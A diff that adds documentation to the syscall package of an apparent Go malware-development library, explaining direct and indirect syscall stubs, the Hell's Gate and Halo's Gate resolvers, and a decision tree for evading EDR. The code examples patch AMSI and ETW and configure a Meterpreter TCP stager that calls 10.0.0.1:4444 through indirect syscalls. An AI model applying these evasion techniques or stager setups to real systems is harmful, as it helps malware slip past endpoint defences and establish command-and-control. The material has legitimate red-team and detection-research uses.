@@ -4,6 +4,23 @@
 
 The `win/syscall` package provides a `Caller` that routes NT function calls through four strategies, allowing the same injection or evasion code to transparently switch between detectable WinAPI calls and stealthy indirect syscalls.
 
+---
+
+## How Windows Syscalls Work
+
+Every NT function in `ntdll.dll` follows the same pattern on x64:
+
+```asm
+mov r10, rcx         ; save first arg (Windows syscall convention uses r10, not rcx)
+mov eax, <SSN>       ; load the Syscall Service Number
+syscall              ; transition to kernel
+ret
+```
+
+The SSN (Syscall Service Number) is an index into the kernel's System Service Descriptor Table (SSDT). EDR products hook these functions by overwriting the prologue bytes with a JMP to their monitoring code.
+
+---
+
 ## Method Comparison
 
 | Method | Constant | Bypass kernel32 hooks | Bypass ntdll hooks | Survive memory scan | Survive stack analysis |
@@ -13,39 +30,264 @@ The `win/syscall` package provides a `Caller` that routes NT function calls thro
 | Direct | `MethodDirect` | Yes | Yes | No | -- |
 | Indirect | `MethodIndirect` | Yes | Yes | Yes | Yes |
 
+### MethodWinAPI
+
+Calls the NT function through `ntdll.dll` using Go's `LazyProc.Call()`. This is the standard way Windows APIs are invoked. The call flows through kernel32.dll (or advapi32.dll) down to ntdll.dll, and then into the kernel.
+
+**At the OS level:** `LazyProc.Find()` resolves the export address in ntdll.dll, then `proc.Call()` invokes it via Go's `syscall.SyscallN`. Both the kernel32 and ntdll entry points are visible to EDR hooks.
+
+**When to use:** Development, testing, or environments without EDR. Maximum compatibility.
+
+### MethodNativeAPI
+
+Identical implementation to WinAPI -- both call through `ntdll.dll` via `LazyProc`. The distinction exists so callers can express intent ("I want to call NtXxx directly, not the kernel32 wrapper"). In practice, for NT functions like `NtAllocateVirtualMemory`, the WinAPI and NativeAPI paths are the same because these functions only exist in ntdll.
+
+**At the OS level:** Same as WinAPI. The call lands at the ntdll export address, which EDR can hook.
+
+**When to use:** When you want to bypass kernel32 hooks specifically (e.g., hooks on `VirtualAlloc` in kernel32 that redirect before reaching `NtAllocateVirtualMemory` in ntdll). In practice, most EDRs hook at the ntdll level, so this offers limited additional stealth.
+
+### MethodDirect
+
+Builds a tiny assembly stub in RWX memory that contains the `syscall` instruction. The stub executes the syscall from your process's private memory, never touching the (potentially hooked) ntdll code.
+
+**At the OS level:** The Caller resolves the SSN via the configured resolver, then:
+
+1. Allocates RWX memory via `VirtualAlloc`.
+2. Writes this 12-byte stub into it:
+
+```
+Offset  Bytes             Instruction          Purpose
+------  -----             -----------          -------
+0x00    4C 8B D1          mov r10, rcx         Copy first arg to r10 (kernel expects it there)
+0x03    B8 XX XX 00 00    mov eax, <SSN>       Load the syscall number
+0x07    0F 05             syscall              Transition to kernel mode
+0x09    C3                ret                  Return to caller
+```
+
+3. Calls the stub via `syscall.SyscallN(stubAddr, args...)`.
+4. Frees the stub memory.
+
+**Detection risk:** Memory scanners can flag the `0F 05` (`syscall`) instruction outside of ntdll's address range. EDRs that check "did this syscall come from ntdll?" will detect this.
+
+**When to use:** EDR hooks ntdll but does not perform call-stack analysis or memory scanning for syscall instructions.
+
+### MethodIndirect
+
+Like Direct, but instead of executing `syscall` in private memory, it JMPs to a `syscall; ret` gadget found inside ntdll itself. The kernel-mode transition appears to originate from ntdll's address space.
+
+**At the OS level:** The Caller resolves the SSN, then:
+
+1. Scans ntdll's `.text` section for the byte sequence `0F 05 C3` (`syscall; ret`). This gadget exists in every unhooked NT function's epilogue.
+2. Allocates RWX memory and writes this ~21-byte stub:
+
+```
+Offset  Bytes                          Instruction            Purpose
+------  -----                          -----------            -------
+0x00    4C 8B D1                       mov r10, rcx           Copy first arg
+0x03    B8 XX XX 00 00                 mov eax, <SSN>         Load syscall number
+0x07    49 BB <8 bytes gadget addr>    mov r11, <gadget>      Load gadget address
+0x11    41 FF E3                       jmp r11                Jump into ntdll
+```
+
+3. Calls the stub. Execution flows: stub -> JMP to ntdll gadget -> `syscall; ret` -> returns to caller.
+
+**Why this defeats stack analysis:** When the kernel examines the return address on the stack, it sees an address inside ntdll.dll. Memory scanners see the `syscall` instruction at a legitimate ntdll address.
+
+**Gadget scanning:** `findSyscallGadget` parses the PE headers of ntdll (MZ -> PE -> section table), finds the `.text` section, and linearly scans for `0F 05 C3`. The first match is used.
+
+**When to use:** Maximum stealth. The EDR hooks ntdll AND performs call-stack analysis AND scans for out-of-module syscall instructions.
+
+---
+
 ## SSN Resolvers
 
-SSN Resolvers determine the Syscall Service Number for each NT function:
+The SSN (Syscall Service Number) changes between Windows builds. Resolvers determine the correct SSN at runtime by reading ntdll's in-memory code.
 
-| Resolver | Function | Handles hooked functions |
-|----------|----------|------------------------|
-| `NewHellsGate()` | Reads SSN from ntdll prologue | No -- fails if hooked |
-| `NewHalosGate()` | Scans neighboring stubs | Yes -- sequential SSN arithmetic |
-| `NewTartarus()` | Extends Halo's Gate | Yes -- JMP hook displacement |
-| `Chain(r1, r2, ...)` | Tries resolvers in sequence | Yes -- first success wins |
+### SSNResolver Interface
 
-## Example: Switching Syscall Methods
+```go
+type SSNResolver interface {
+    Resolve(ntFuncName string) (uint16, error)
+}
+```
+
+### HellsGateResolver
+
+```go
+resolver := wsyscall.NewHellsGate()
+```
+
+**How it works:** Reads the first 8 bytes of the target function's prologue in ntdll:
+
+```
+Expected:  4C 8B D1 B8 XX XX 00 00
+           -------- -- --------
+           mov r10  mov eax, SSN
+```
+
+If bytes 0-3 match `4C 8B D1 B8`, the SSN is extracted from bytes 4-5 (little-endian uint16).
+
+**Limitation:** Fails if the function is hooked. EDR hooks typically overwrite the first bytes with a JMP (`E9` or `EB`), so the `4C 8B D1 B8` pattern will not match.
+
+### HalosGateResolver
+
+```go
+resolver := wsyscall.NewHalosGate()
+```
+
+**How it works:** First tries Hell's Gate. If the target function is hooked, it scans neighboring syscall stubs. On x64, each ntdll syscall stub is exactly 32 bytes, and SSNs are assigned sequentially. If the function at `addr - N*32` has an intact prologue with `SSN=X`, then the target's SSN is `X + N`.
+
+The scan checks up to 500 stubs in both directions (above and below the target function).
+
+**Why it works:** EDRs typically only hook a subset of NT functions (the "interesting" ones like `NtAllocateVirtualMemory`, `NtCreateThreadEx`, etc.). Neighboring functions that are not security-relevant remain unhooked, and their SSNs reveal the target's SSN by arithmetic.
+
+### TartarusGateResolver
+
+```go
+resolver := wsyscall.NewTartarus()
+```
+
+Extends Halo's Gate by recognizing JMP-hook patches and extracting the original SSN from the hook displacement. Currently delegates to `HalosGateResolver` (the JMP-displacement analysis is not yet implemented).
+
+### ChainResolver
+
+```go
+resolver := wsyscall.Chain(
+    wsyscall.NewHellsGate(),
+    wsyscall.NewHalosGate(),
+    wsyscall.NewTartarus(),
+)
+```
+
+**Purpose:** Tries each resolver in order. Returns the first successful result.
+
+**Why:** Provides resilience. If Hell's Gate fails (function hooked), Halo's Gate can recover via neighbor scanning. If Halo's Gate also fails (all neighbors hooked), Tartarus can try JMP displacement analysis.
+
+---
+
+## Caller
+
+### New
+
+```go
+func New(method Method, r SSNResolver) *Caller
+```
+
+**Parameters:**
+- `method` -- One of `MethodWinAPI`, `MethodNativeAPI`, `MethodDirect`, `MethodIndirect`.
+- `r` -- An `SSNResolver`. Only required for `MethodDirect` and `MethodIndirect` (pass `nil` for WinAPI/NativeAPI).
+
+### Call
+
+```go
+func (c *Caller) Call(ntFuncName string, args ...uintptr) (uintptr, error)
+```
+
+**Parameters:**
+- `ntFuncName` -- The NT function name exactly as exported by ntdll (e.g., `"NtAllocateVirtualMemory"`).
+- `args` -- The function arguments as `uintptr` values.
+
+**Returns:** `(NTSTATUS, error)`. NTSTATUS 0 = success.
+
+---
+
+## Complete Examples
+
+### Example 1: Standard WinAPI (no resolver needed)
 
 ```go
 import wsyscall "github.com/oioio-space/maldev/win/syscall"
 
-// Standard WinAPI (default, most compatible)
 caller := wsyscall.New(wsyscall.MethodWinAPI, nil)
 
-// Direct syscall with Hell's Gate SSN resolution
-caller = wsyscall.New(wsyscall.MethodDirect, wsyscall.NewHellsGate())
+// Allocate memory via NtAllocateVirtualMemory
+var addr uintptr
+var regionSize uintptr = 4096
+status, err := caller.Call("NtAllocateVirtualMemory",
+    ^uintptr(0),                        // current process
+    uintptr(unsafe.Pointer(&addr)),
+    0,
+    uintptr(unsafe.Pointer(&regionSize)),
+    windows.MEM_COMMIT|windows.MEM_RESERVE,
+    uintptr(windows.PAGE_READWRITE),
+)
+```
 
-// Indirect syscall with chained resolvers (most stealthy)
-caller = wsyscall.New(
+### Example 2: Direct Syscall with Hell's Gate
+
+```go
+import wsyscall "github.com/oioio-space/maldev/win/syscall"
+
+caller := wsyscall.New(wsyscall.MethodDirect, wsyscall.NewHellsGate())
+
+// Same Call API -- the stub is built and destroyed per invocation
+status, err := caller.Call("NtProtectVirtualMemory",
+    ^uintptr(0),
+    uintptr(unsafe.Pointer(&baseAddr)),
+    uintptr(unsafe.Pointer(&regionSize)),
+    uintptr(windows.PAGE_EXECUTE_READ),
+    uintptr(unsafe.Pointer(&oldProtect)),
+)
+```
+
+### Example 3: Indirect Syscall with Chained Resolvers (Maximum Stealth)
+
+```go
+import wsyscall "github.com/oioio-space/maldev/win/syscall"
+
+caller := wsyscall.New(
     wsyscall.MethodIndirect,
     wsyscall.Chain(wsyscall.NewHellsGate(), wsyscall.NewHalosGate()),
 )
 
-// Pass the caller to any technique that accepts *wsyscall.Caller
+// Pass to any technique package
 err := amsi.PatchScanBuffer(caller)
 err = etw.Patch(caller)
 err = blockdlls.Enable(caller)
-err = acg.Enable(caller)
 ```
 
-All technique packages that accept a `*wsyscall.Caller` parameter treat `nil` as "use standard WinAPI", making the syscall method entirely opt-in.
+### Example 4: Passing Caller to Meterpreter
+
+```go
+import (
+    wsyscall "github.com/oioio-space/maldev/win/syscall"
+    "github.com/oioio-space/maldev/c2/meterpreter"
+)
+
+caller := wsyscall.New(wsyscall.MethodIndirect, wsyscall.NewHalosGate())
+
+stager := meterpreter.NewStager(&meterpreter.Config{
+    Transport: meterpreter.TransportTCP,
+    Host:      "10.0.0.1",
+    Port:      "4444",
+    Caller:    caller, // VirtualAlloc/Protect/CreateThread go through indirect syscalls
+})
+```
+
+---
+
+## Nil Caller Convention
+
+All technique packages that accept a `*wsyscall.Caller` parameter treat `nil` as "use standard WinAPI". This makes the syscall method entirely opt-in:
+
+```go
+// These are equivalent:
+err := amsi.PatchScanBuffer(nil)                                          // standard WinAPI
+err = amsi.PatchScanBuffer(wsyscall.New(wsyscall.MethodWinAPI, nil))      // explicit WinAPI
+```
+
+## Choosing a Method -- Decision Tree
+
+```
+Is there an EDR?
+  No  --> MethodWinAPI (simplest, most compatible)
+  Yes --> Does the EDR hook kernel32?
+    No  --> MethodWinAPI
+    Yes --> Does the EDR hook ntdll?
+      No  --> MethodNativeAPI
+      Yes --> Does the EDR scan for out-of-module syscall instructions?
+        No  --> MethodDirect + NewHellsGate()
+        Yes --> Does the EDR do call-stack analysis?
+          No  --> MethodDirect + NewHalosGate()
+          Yes --> MethodIndirect + Chain(NewHellsGate(), NewHalosGate())
+```
